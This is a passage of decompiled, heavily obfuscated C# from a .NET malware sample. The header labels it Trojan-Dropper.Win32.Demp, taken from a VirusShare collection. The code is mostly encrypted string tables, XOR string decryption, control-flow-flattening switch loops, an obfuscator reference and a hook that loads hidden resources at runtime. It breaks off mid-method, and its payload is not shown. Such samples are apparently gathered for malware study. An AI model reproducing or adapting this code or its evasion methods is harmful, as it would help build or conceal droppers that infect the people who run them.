// Decompiled with JetBrains decompiler
// Type: Ⴐ.ႰႭ
// Assembly: KaMaL, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8DF9AD97-3392-4345-A8B5-C984422A3CEF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Dropper.Win32.Demp.fcu-3f5521cab698fc4794ea6586633506a26a956e4e7edb7510002b7865e093fded.exe

using Evaluation;
using KaMaL;
using KaMaL.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.ComponentModel.Design;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security;
using System.Threading;
using System.Windows.Forms;

namespace Ⴐ
{
  [StandardModule]
  [HideModuleName]
  internal sealed class ႰႭ
  {
    private static bool Ⴐ;
    private static readonly Array ႰႰ;
    private static readonly object ႰႤ = (object) new char[454]
    {
      '뙄',
      '뙄',
      '뙄',
      '뙤',
      '꺉',
      '誽',
      'ꢨ',
      '黒',
      '謗',
      '鼓',
      '聋',
      '覝',
      '꺋',
      '誳',
      'ꢨ',
      '黟',
      '謒',
      '齀',
      '聎',
      '视',
      '꺃',
      '諭',
      'ꣻ',
      '黚',
      '謔',
      '齃',
      '耙',
      '視',
      '껝',
      '諪',
      'ꢩ',
      '黙',
      '謓',
      '鼐',
      '聊',
      '观',
      'Ｊ',
      'Ｋ',
      'Ｋ',
      '［',
      '숚',
      '혯',
      '쥡',
      '삟',
      '\uE7BC',
      '쎖',
      '\uE1C1',
      'ퟥ',
      '숭',
      '혉',
      '쥺',
      '삥',
      '\uE7A0',
      '쎁',
      '\uE1DC',
      'ퟰ',
      '䥍',
      '䥏',
      '䥏',
      '䥃',
      '凢',
      '痥',
      '垳',
      '憕',
      '瑀',
      '恋',
      '缥',
      '盇',
      '凂',
      '痥',
      '垡',
      '憄',
      '彻',
      '彸',
      '彸',
      '彬',
      '䟉',
      '揃',
      '䆢',
      '瞹',
      '扷',
      '癸',
      '椶',
      '惎',
      '䟮',
      '插',
      '䆀',
      '瞘',
      '扼',
      '癊',
      '椣',
      '惻',
      '䟳',
      '揞',
      '䆘',
      '瞹',
      '♚',
      '♞',
      '♞',
      '♐',
      '㻷',
      '\u1AF8',
      '㢣',
      '\u0E85',
      'ᭉ',
      'ཞ',
      'ဌ',
      '᧿',
      '㻍',
      '\u1AFD',
      '㢾',
      '\u0E92',
      '᭹',
      'ཇ',
      '㬁',
      '㬄',
      '㬄',
      '㬔',
      '◌',
      'Ꮞ',
      'ؒ',
      'ሱ',
      '\u0D52',
      'Җ',
      '⎞',
      'ު',
      '◯',
      'Ꮸ',
      '؉',
      'ላ',
      'ൎ',
      'ҁ',
      '⎃',
      '\u07BF',
      '\uF2BB',
      '\uF2BD',
      '\uF2BD',
      '\uF2AF',
      '쓔',
      '촯',
      '\uEA2B',
      '츆',
      '\uEC57',
      '\uDA42',
      '쾭',
      '\uDBB3',
      '쓠',
      '촸',
      '\uEA31',
      '츁',
      '\uEC7F',
      '\uDA77',
      '쾲',
      '\uDBB3',
      '쓱',
      '촤',
      '꾪',
      '꾭',
      '꾭',
      '꾼',
      '銝',
      '蚩',
      '駲',
      '逩',
      '뜂',
      '錐',
      '녍',
      '蝡',
      '銪',
      '蚿',
      '駠',
      '退',
      '뜷',
      '錏',
      '녍',
      '蝰',
      '銶',
      '牀',
      '版',
      '版',
      '牆',
      '仄',
      '沵',
      '媂',
      '佋',
      '孝',
      '䐓',
      '䷸',
      '櫅',
      '仨',
      '沤',
      '媂',
      '余',
      '孚',
      '䐷',
      '튬',
      '튥',
      '튥',
      '튧',
      '屮',
      '\uEFFE',
      '㴶',
      '㴼',
      '㴼',
      '㴸',
      'Ǖ',
      '⎇',
      'ᖦ',
      '\u0018',
      '₾',
      '₵',
      '₵',
      '₡',
      'ᰠ',
      '㹍',
      'ࡏ',
      'ᶹ',
      'হ',
      'ᛪ',
      'ἥ',
      '㠜',
      'ᰓ',
      '㹟',
      '\u086D',
      'ᶘ',
      'ল',
      'ᛘ',
      'ἰ',
      '㠩',
      'ᰎ',
      '㹓',
      '\u0875',
      'ᶹ',
      '怱',
      '怽',
      '怽',
      '怩',
      '岾',
      '绝',
      '䣵',
      '崰',
      '䤌',
      '噪',
      '徾',
      '碶',
      '岇',
      '绀',
      '䣷',
      '崝',
      '䤳',
      '噻',
      '忳',
      '碋',
      '岟',
      '结',
      '䣵',
      '崺',
      'ᤛ',
      'ᤖ',
      'ᤖ',
      'ᤆ',
      '▕',
      '߸',
      '㇛',
      '␑',
      '〛',
      '⽸',
      '⚄',
      'Ɔ',
      '▽',
      '߬',
      '㇚',
      '␀',
      '〹',
      '⽉',
      '⚛',
      'ƌ',
      '癄',
      '癊',
      '癊',
      '癆',
      '彧',
      '䀕',
      '䧈',
      '滐',
      '䫩',
      '梓',
      '庀',
      '䭚',
      '彘',
      '䀝',
      '䧅',
      '滛',
      'ؒ',
      '\u061D',
      '\u061D',
      'ؓ',
      '⼰',
      'あ',
      '㦟',
      'ẇ',
      '㪾',
      'ᣑ',
      '⻝',
      '㬏',
      '⼅',
      'け',
      '㦔',
      'ẅ',
      '㪺',
      'ᣦ',
      '啃',
      '啓',
      '啓',
      '啃',
      '櫿',
      '䷍',
      '槾',
      '䮹',
      '綐',
      '桲',
      '籝',
      '挀',
      '櫃',
      '䷍',
      '槲',
      '䮥',
      '網',
      '桐',
      '籟',
      '挈',
      '\uEB34',
      '\uEB25',
      '\uEB25',
      '\uEB32',
      '쏞',
      '혢',
      '숼',
      '\uDD6F',
      '풇',
      '\uF3B5',
      '힒',
      '\uF5EE',
      '쏯',
      '혴',
      '숧',
      '\uDD69',
      '풬',
      '\uF3AA',
      '힞',
      '\uF5C3',
      '쏥',
      '혩',
      '쉪',
      '\uDD4F',
      '풠',
      '\uF3A2',
      '힞',
      '\uE419',
      '\uE40B',
      '\uE40B',
      '\uE403',
      '퉺',
      '\uDBA0',
      'ﲶ',
      '\uD8B1',
      '\uFAF0',
      '쳐',
      '\uD906',
      '촄',
      '솪',
      '솹',
      '솹',
      '솲',
      '\uDF60',
      '\uE973',
      'ﲩ',
      '\uE8AB',
      '\uF7EE',
      '︶',
      '\uD928',
      'ﵖ',
      '\uDF4D',
      '\uE926',
      'ﲦ',
      '檼',
      '檨',
      '檨',
      '檋',
      '嘷',
      '瑕',
      '䉨',
      '垺',
      '䎬',
      '峤',
      '唼',
      '爮',
      '噇',
      '瑄',
      '䉦',
      '垤',
      '䏩',
      '峹',
      '唦',
      '爻',
      '嘞',
      '琇',
      '䉥',
      '垯',
      '䏩',
      '峥',
      '唭',
      '爣',
      '噇',
      '瑓',
      '䉨',
      '埪',
      '䎇',
      '峹',
      '唼',
      '爿',
      '嘎',
      '瑉',
      '䉠',
      '꺓',
      '꺆',
      '꺆',
      '꺜',
      '똮',
      '鈠',
      '끧',
      '虯',
      '鎋',
      '螕',
      '飕',
      '鄕',
      '똦',
      '鈚',
      '끬',
      '虌',
      '鎭',
      '螉',
      '飖',
      '鄃',
      '똋',
      '鈌',
      '끱',
      '虊',
      '鎁',
      '螗',
      '飌',
      '鄏',
      '똖',
      '鈧'
    };
    private static readonly Array ႰႥ;
    internal static ႰႭ.ႰႷ ႰႨ;

    [HelpKeyword("My.Settings")]
    internal static MySettings Ⴈ
    {
      get
      {
        byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
        MySettings mySettings = MySettings.Default;
        ႰႭ.Ⴍ();
        return mySettings;
      }
    }

    static ႰႭ()
    {
      char[] chArray = new char[8]
      {
        '㵢',
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        '㳏',
        char.MinValue,
        char.MinValue
      };
      chArray[1] = '⥡';
      chArray[7] = '⢯';
      chArray[2] = '㘾';
      chArray[3] = '㿠';
      chArray[4] = '\u18FF';
      chArray[6] = 'ẏ';
      ႰႭ.ႰႥ = (Array) new string[22];
      ႰႭ.ႰႰ = (Array) chArray;
      ႰႭ.Ⴜ();
    }

    internal static object Ⴀ()
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int num1 = 736;
      int num2 = num1;
      int num3 = (num2 * num2 + num1) % 2 == 0 ? 1 : (int) ⴗ[35];
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 1:
            ႰႭ.Ⴀ();
            num3 = (int) ⴀ[68] - (int) ⴀ[14];
            continue;
          case 2:
          case 4:
          case 5:
            num3 = 3;
            continue;
          case 3:
            goto label_6;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.Ⴀ);
            num3 = 6;
            continue;
        }
      }
label_6:
      return (object) null;
    }

    internal static System.Type Ⴈ()
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int num1 = 1754;
      int num2 = num1;
      int num3 = num2 * num2;
      int num4 = num1 + num3;
label_4:
      int num5 = (int) ⴗ[216] - 236;
      while (true)
      {
        switch (num5)
        {
          case 0:
          case 6:
            goto label_3;
          case 1:
            ႰႭ.Ⴈ();
            num5 = 2;
            continue;
          case 2:
            goto label_7;
          case 3:
          case 4:
            num5 = num4 % 2 != 0 ? (int) ⴗ[35] : 1;
            continue;
          case 5:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.Ⴈ);
            num5 = (int) ⴀ[165] - (int) ⴀ[164];
            continue;
        }
      }
label_7:
      return typeof (jDxmSbcafQKRuIHXbd.HsyGXxwNDGxWzecKyTJzOYHHttVeq);
    }

    internal static object Ⴃ()
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int num1 = 1727;
label_4:
      int num2 = num1;
      int num3 = num2 * num2;
      int num4 = num1;
      int num5 = num3;
      MyApplication.Ⴀ[170] = jDxmSbcafQKRuIHXbd.Ⴗ[3];
      int num6 = num4 + num5;
      int num7 = 1;
      while (true)
      {
        switch (num7)
        {
          case 0:
          case 5:
            goto label_7;
          case 1:
            num7 = num6 % 2 != 0 ? (int) ⴀ[54] - 245 : 6;
            continue;
          case 2:
            goto label_4;
          case 3:
          case 4:
            goto label_3;
          case 6:
            ႰႭ.Ⴃ();
            num7 = (int) ⴗ[0] - 227;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.Ⴃ);
            num7 = (int) ⴀ[174] - (int) ⴀ[167];
            continue;
        }
      }
label_7:
      return (object) null;
    }

    internal static byte Ⴄ()
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) Ⴐ.Ⴈ.ႳႷ(ႰႭ.ႰႳ('¿', 165), ႰႭ.ႰႣ(9L, 4, 1779788317), (short) 956, 933);
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 6:
            goto label_9;
          case 1:
            num1 = (byte) 8 == (obj as byte[])[index] ? (int) ⴗ[35] : (int) ⴗ[204];
            continue;
          case 2:
            ++index;
            num1 = (int) ⴗ[160] - (int) ⴗ[236];
            continue;
          case 3:
            goto label_4;
          case 4:
            num1 = ((byte[]) obj)[index] < (byte) 8 ? 3 : 1;
            continue;
          case 5:
          case 8:
            goto label_18;
          case 7:
          case 11:
            num1 = (byte) 207 == (obj as byte[])[index] ? (int) ⴀ[182] / 7 : (int) ⴗ[145] - (int) ⴗ[170];
            continue;
          case 9:
            Ⴐ.Ⴜ.Ⴄ();
            num1 = (int) ⴀ[118] - 109;
            continue;
          case 12:
            goto label_14;
          case 13:
            num1 = (obj as byte[])[index] < (byte) 207 ? 6 : (int) ⴀ[111] - 45;
            continue;
          case 14:
            num1 = ((byte[]) obj)[index] < (byte) 4 ? (int) ⴀ[166] - 5 : 18;
            continue;
          case 15:
            goto label_3;
          case 16:
            int num2 = (int) Ⴐ.Ⴜ.Ⴈ();
            num1 = 2;
            continue;
          case 17:
            MyComputer.Ⴐ();
            num1 = 19;
            continue;
          case 18:
            num1 = (byte) 4 == ((byte[]) obj)[index] ? 5 : (int) ⴗ[235];
            continue;
          case 19:
            ++index;
            num1 = 14;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.Ⴄ);
            num1 = 15;
            continue;
        }
      }
label_4:
      return 26;
label_9:
      return 28;
label_14:
      return 7;
label_18:
      int num3 = index + 1;
      return 21;
    }

    internal static System.Type Ⴍ()
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int index = 0;
      Array array = (Array) Ⴐ.Ⴈ.ႳႷ(ႰႭ.ႰႳ('ɒ', 585), ႰႭ.ႰႣ(10L, 0, 1779788313), (short) 355, 377);
      int num1 = (int) ⴗ[25];
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 20:
            goto label_9;
          case 1:
            goto label_24;
          case 2:
            goto label_4;
          case 3:
            goto label_19;
          case 4:
            int num2 = (int) Ⴐ.Ⴜ.Ⴍ();
            num1 = 18;
            continue;
          case 5:
            num1 = (byte) 8 == ((byte[]) array)[index] ? (int) ⴗ[5] - 133 : (int) ⴀ[94] - 59;
            continue;
          case 6:
            goto label_3;
          case 8:
          case 13:
            Ⴐ.Ⴜ.Ⴅ();
            num1 = (int) ⴀ[123] - 184;
            continue;
          case 9:
            ++index;
            num1 = 17;
            continue;
          case 10:
            ++index;
            num1 = 16;
            continue;
          case 11:
            int num3 = (int) Ⴐ.Ⴜ.Ⴈ();
            num1 = (int) ⴗ[235];
            continue;
          case 12:
            num1 = ((byte[]) array)[index] < (byte) 207 ? 20 : 27;
            continue;
          case 14:
          case 17:
            num1 = (array as byte[])[index] < (byte) 14 ? (int) ⴗ[209] - (int) ⴗ[142] : 29;
            continue;
          case 15:
            goto label_14;
          case 16:
            num1 = (array as byte[])[index] < (byte) 4 ? 15 : (int) ⴗ[38] - 205;
            continue;
          case 18:
            ++index;
            num1 = (int) ⴗ[61] - 53;
            continue;
          case 19:
            num1 = ((byte[]) array)[index] < (byte) 157 ? (int) ⴗ[244] - 49 : (int) ⴗ[241] - 6;
            continue;
          case 21:
            ႰႭ.Ⴈ();
            num1 = (int) ⴗ[34] - (int) ⴗ[132];
            continue;
          case 22:
            num1 = (byte) 157 == ((byte[]) array)[index] ? 24 : (int) ⴗ[235] - (int) ⴗ[8];
            continue;
          case 23:
            num1 = ((byte[]) array)[index] < (byte) 8 ? (int) ⴗ[35] : 5;
            continue;
          case 24:
            goto label_28;
          case 25:
            ++index;
            num1 = 12;
            continue;
          case 26:
            num1 = (byte) 4 == ((byte[]) array)[index] ? 9 : 11;
            continue;
          case 27:
            num1 = (byte) 207 == ((byte[]) array)[index] ? 10 : 28;
            continue;
          case 28:
            MyComputer.Ⴀ();
            num1 = 10;
            continue;
          case 29:
            num1 = (byte) 14 == ((byte[]) array)[index] ? 18 : 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.Ⴍ);
            num1 = 6;
            continue;
        }
      }
label_4:
      return typeof (cDsuOaxlniBDIMDsUvHfZwdLOAJyVcwtcxkDnLTiOAM);
label_9:
      return typeof (jDxmSbcafQKRuIHXbd.QKcZvSqwsE);
label_14:
      return typeof (cDsuOaxlniBDIMDsUvHfZwdLOAJyVcwtcxkDnLTiOAM.XRSJOfbzGbcliwcTzQdFmgQESOEmlXABzaXHh);
label_19:
      return typeof (jDxmSbcafQKRuIHXbd.hsmFCZuTLITkyUIRpkNPvQVdTyIIHMipwbonEHKCapiSBDXzFSPxLkk);
label_24:
      return typeof (jDxmSbcafQKRuIHXbd.OewRkeUzJJINxqxcpoFILDbqjTCEYBGTdyMzlNjiKrJuyZ);
label_28:
      int num4 = index + 1;
      return typeof (jDxmSbcafQKRuIHXbd.OewRkeUzJJINxqxcpoFILDbqjTCEYBGTdyMzlNjiKrJuyZ);
    }

    internal static int Ⴅ()
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int index = 0;
label_4:
      object obj = (object) (byte[]) Ⴐ.Ⴈ.ႳႷ(ႰႭ.ႰႠ(560, (short) 579), ႰႭ.ႰႣ(11L, 7, 1779788318), (short) 789, 782);
      int num1 = 18;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 12:
            Ⴐ.Ⴜ.Ⴄ();
            num1 = (int) ⴀ[164] - 35;
            continue;
          case 1:
          case 2:
            ++index;
            num1 = 14;
            continue;
          case 3:
            goto label_5;
          case 4:
            goto label_3;
          case 6:
            ++index;
            num1 = 8;
            continue;
          case 7:
            int num2 = (int) Ⴐ.Ⴜ.Ⴍ();
            num1 = 6;
            continue;
          case 8:
            num1 = (obj as byte[])[index] < (byte) 207 ? (int) ⴀ[129] - 212 : 9;
            continue;
          case 9:
            num1 = (byte) 207 == (obj as byte[])[index] ? 1 : (int) ⴀ[9] - 40;
            continue;
          case 10:
            num1 = (byte) 8 == (obj as byte[])[index] ? (int) ⴀ[39] - (int) ⴀ[132] : 7;
            continue;
          case 11:
            goto label_4;
          case 13:
            int num3 = (int) Ⴐ.Ⴜ.Ⴈ();
            num1 = 15;
            continue;
          case 14:
            num1 = ((byte[]) obj)[index] < (byte) 4 ? (int) ⴗ[245] : 17;
            continue;
          case 15:
            goto label_19;
          case 16:
            goto label_10;
          case 17:
            num1 = (byte) 4 == ((byte[]) obj)[index] ? (int) ⴀ[51] - 124 : 13;
            continue;
          case 18:
            num1 = (obj as byte[])[index] < (byte) 8 ? (int) ⴗ[240] - 67 : 10;
            continue;
          case 19:
            goto label_15;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.Ⴅ);
            num1 = (int) ⴗ[249] - 126;
            continue;
        }
      }
label_5:
      return 2;
label_10:
      return 6;
label_15:
      return 9;
label_19:
      int num4 = index + 1;
      return 15;
    }

    internal static System.Type Ⴗ()
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int index = 0;
      Array array = (Array) Ⴐ.Ⴈ.ႳႷ(ႰႭ.ႰႠ(286, (short) 362), ႰႭ.ႰႣ(12L, 6, 1779788319), (short) 519, 539);
      int num1 = (int) ⴀ[53] / 6;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (byte) 207 == (array as byte[])[index] ? 8 : 3;
            continue;
          case 1:
            Ⴐ.Ⴜ.Ⴓ();
            num1 = 6;
            continue;
          case 2:
          case 8:
          case 10:
            ++index;
            num1 = (int) ⴀ[36] + 7;
            continue;
          case 3:
            int num2 = (int) Ⴐ.Ⴜ.Ⴈ();
            int num3 = (int) ⴗ[47];
            MyApplication.Ⴀ[28] = (byte) ((int) MyApplication.Ⴀ[28] + (int) MyApplication.Ⴀ[139] & 246);
            num1 = num3 - 122;
            continue;
          case 4:
            ႰႭ.Ⴀ();
            num1 = (int) ⴀ[97] / 4;
            continue;
          case 5:
          case 14:
            num1 = ((byte[]) array)[index] < (byte) 4 ? (int) ⴀ[36] : 19;
            continue;
          case 6:
            goto label_18;
          case 7:
            goto label_14;
          case 9:
            goto label_9;
          case 11:
            ++index;
            num1 = (int) ⴀ[95] - 97;
            continue;
          case 12:
            num1 = (array as byte[])[index] < (byte) 207 ? 9 : 0;
            continue;
          case 13:
            goto label_3;
          case 15:
            goto label_4;
          case 16:
            num1 = (array as byte[])[index] < (byte) 8 ? 15 : (int) ⴗ[49] - 151;
            continue;
          case 18:
            num1 = (byte) 8 == (array as byte[])[index] ? (int) ⴀ[173] - 71 : (int) ⴗ[8] * 4;
            continue;
          case 19:
            num1 = (byte) 4 == ((byte[]) array)[index] ? 6 : 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.Ⴗ);
            num1 = 13;
            continue;
        }
      }
label_4:
      return typeof (jDxmSbcafQKRuIHXbd.xQkExnTccbgRKRvJIYbeWuKDmVXrUZmwSf);
label_9:
      return typeof (DeepSeaObfuscator);
label_14:
      return typeof (cDsuOaxlniBDIMDsUvHfZwdLOAJyVcwtcxkDnLTiOAM.MhKveQUwsjqNSDUhFROKGcFdloZWMHsIrLSqjaLPS);
label_18:
      int num4 = index + 1;
      return typeof (cDsuOaxlniBDIMDsUvHfZwdLOAJyVcwtcxkDnLTiOAM.UmxzehCaptCofCItLmgxm);
    }

    internal static int Ⴓ()
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) Ⴐ.Ⴈ.ႳႷ(ႰႭ.ႰႠ(351, (short) 298), ႰႭ.ႰႣ(8L, 6, 1779788319), (short) 296, 309);
      int num1 = 23;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_23;
          case 1:
            ႰႭ.Ⴀ();
            num1 = 2;
            continue;
          case 2:
          case 16:
            ++index;
            num1 = (int) ⴀ[14] - (int) ⴀ[55];
            continue;
          case 3:
            goto label_14;
          case 4:
            ++index;
            num1 = 8;
            continue;
          case 5:
            ႰႭ.Ⴀ();
            num1 = 0;
            continue;
          case 6:
            num1 = (byte) 8 == ((byte[]) obj)[index] ? 13 : (int) ⴀ[53] - 84;
            continue;
          case 7:
            num1 = (obj as byte[])[index] < (byte) 207 ? 18 : (int) ⴀ[94] - 71;
            continue;
          case 8:
            num1 = ((byte[]) obj)[index] < (byte) 14 ? (int) ⴀ[14] - 149 : 15;
            continue;
          case 9:
          case 14:
            num1 = (byte) 207 == ((byte[]) obj)[index] ? (int) ⴗ[35] : 1;
            continue;
          case 10:
            num1 = (obj as byte[])[index] < (byte) 4 ? 3 : (int) ⴀ[111] - 31;
            continue;
          case 11:
            Ⴐ.Ⴜ.Ⴄ();
            num1 = 4;
            continue;
          case 12:
            Ⴐ.Ⴈ.Ⴄ();
            num1 = (int) ⴀ[55] - 143;
            continue;
          case 13:
            ++index;
            num1 = 7;
            continue;
          case 15:
            num1 = (byte) 14 == ((byte[]) obj)[index] ? 0 : 5;
            continue;
          case 17:
            goto label_19;
          case 18:
          case 19:
            goto label_9;
          case 21:
            num1 = (byte) 4 == (obj as byte[])[index] ? 4 : 11;
            continue;
          case 22:
            goto label_4;
          case 23:
            num1 = ((byte[]) obj)[index] < (byte) 8 ? 22 : 6;
            continue;
          case 24:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.Ⴓ);
            num1 = 24;
            continue;
        }
      }
label_4:
      return 10;
label_9:
      return 6;
label_14:
      return 14;
label_19:
      return 2;
label_23:
      int num2 = index + 1;
      return 10;
    }

    internal static void Ⴜ()
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 3:
            goto label_4;
          default:
            if (!ႰႭ.Ⴐ)
            {
              num1 = (int) ⴀ[113] - 108;
              continue;
            }
            goto label_11;
        }
      }
label_11:
      return;
label_4:
      _Type type;
      Monitor.Enter((object) (System.Type) (type = (_Type) typeof (ႰႭ)));
      try
      {
        int num2 = 3;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 6:
              goto label_15;
            case 1:
              int num3 = (int) ႰႭ.ႨႠ();
              AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(Ⴐ.Ⴈ.ႣႣ);
              num2 = (int) ⴀ[85] - 195;
              continue;
            case 2:
            case 5:
              num2 = (int) ⴗ[212] - 58;
              continue;
            case 4:
              ႰႭ.Ⴐ = true;
              goto case 1;
            default:
              num2 = ႰႭ.Ⴐ ? 6 : 4;
              continue;
          }
        }
      }
      finally
      {
        switch (4)
        {
          case 0:
          default:
            Monitor.Exit((object) (System.Type) type);
            goto case 0;
        }
      }
label_15:
      int num4 = 5;
      while (true)
      {
        switch (num4)
        {
          case 0:
            goto label_19;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.Ⴜ);
            num4 = 0;
            continue;
          default:
            num4 = 0;
            continue;
        }
      }
label_19:;
    }

    internal static byte ႨႠ()
    {
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      object bytes = (object) BitConverter.GetBytes(DateTime.UtcNow.Ticks);
label_4:
      AppDomain.CurrentDomain.SetData("26c9161908c44e4b8f012fc2fab2550f", (object) (byte[]) bytes);
      int num = (int) ⴀ[19] - 102;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_7;
          case 1:
          case 6:
            num = !BitConverter.IsLittleEndian ? (int) ⴀ[18] - (int) ⴀ[18] : (int) ⴀ[36];
            continue;
          case 2:
            goto label_4;
          case 4:
          case 7:
            goto label_6;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.ႨႠ);
            num = (int) ⴀ[110] - 69;
            continue;
        }
      }
label_6:
      Array.Reverse((Array) (bytes as byte[]));
label_7:
      return 12;
    }

    internal static string ႰႣ([In] long obj0, [In] int obj1, [In] int obj2)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int index1 = obj2 ^ 1779788313 ^ obj1;
      object ⴐⴄ = ႰႭ.ႰႤ;
      char[] chArray1 = (char[]) ⴐⴄ;
      int num1 = (int) chArray1[index1 + 1];
      int index2 = (int) chArray1[index1] ^ num1;
      int num2 = (int) ⴀ[103] / 7;
      ICloneable cloneable;
      int num3;
      object obj3;
      Array array;
      char ch;
      int num4;
      int num5;
      int length1;
      int length2;
      object obj4;
      int index3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
            obj4 = (object) new char[length1];
            index3 = 0;
            goto case 6;
          case 2:
            ch = (array as char[])[num3 + 1];
            num4 = (int) (array as char[])[num3 + 2] ^ (int) ch;
            num2 = (int) ⴗ[73] - 130;
            continue;
          case 3:
            char[] chArray2 = (char[]) ⴐⴄ;
            char[] ⴐⴐ = (char[]) ႰႭ.ႰႰ;
            num3 = index1;
            obj3 = (object) ⴐⴐ;
            array = (Array) chArray2;
            num2 = 2;
            continue;
          case 4:
            num2 = index3 < length1 ? 16 : 12;
            continue;
          case 5:
            num5 = (int) ((char[]) array)[num3 + 3] ^ (int) ch;
            num3 += 4;
            num2 = 11;
            continue;
          case 6:
          case 10:
            num2 = (int) ⴀ[189] - 106;
            continue;
          case 7:
          case 15:
            ++index3;
            num2 = 4;
            continue;
          case 8:
            goto label_16;
          case 11:
            length1 = num5 | num4 << 16;
            length2 = ((char[]) obj3).Length;
            num2 = 1;
            continue;
          case 12:
            cloneable = (ICloneable) new string((char[]) obj4);
            ((string[]) ႰႭ.ႰႥ)[index2] = cloneable as string;
            num2 = 8;
            continue;
          case 13:
            num2 = (string) (cloneable = (ICloneable) ((string[]) ႰႭ.ႰႥ)[index2]) == null ? 3 : 14;
            continue;
          case 14:
            goto label_5;
          case 16:
            (obj4 as char[])[index3] = (char) ((uint) ch ^ (uint) (array as char[])[num3 + index3] ^ (uint) (obj3 as char[])[(index3 + num3) % length2]);
            num2 = 7;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.ႰႣ);
            num2 = 0;
            continue;
        }
      }
label_5:
      return (string) cloneable;
label_16:
      return (string) cloneable;
    }

    internal static AppDomain ႰႳ([In] char obj0, [In] int obj1)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = 14;
      IEvidenceFactory evidenceFactory;
      while (true)
      {
        switch (num2)
        {
          case 0:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = (int) ⴀ[182] - 128;
            continue;
          case 1:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = 5;
            continue;
          case 2:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = 5;
            continue;
          case 3:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = 5;
            continue;
          case 4:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = (int) ⴗ[209] - 62;
            continue;
          case 5:
            ++num1;
            int num3 = (int) obj0;
            num2 = (num3 * num3 + (int) obj0) % 2 == 0 ? (int) ⴗ[209] - 48 : (int) ⴀ[84] - 185;
            continue;
          case 6:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = (int) ⴗ[36] / 2;
            continue;
          case 7:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = (int) ⴗ[136] - (int) ⴗ[140];
            continue;
          case 8:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = 5;
            continue;
          case 9:
          case 15:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = (int) ⴀ[14] - 161;
            continue;
          case 10:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
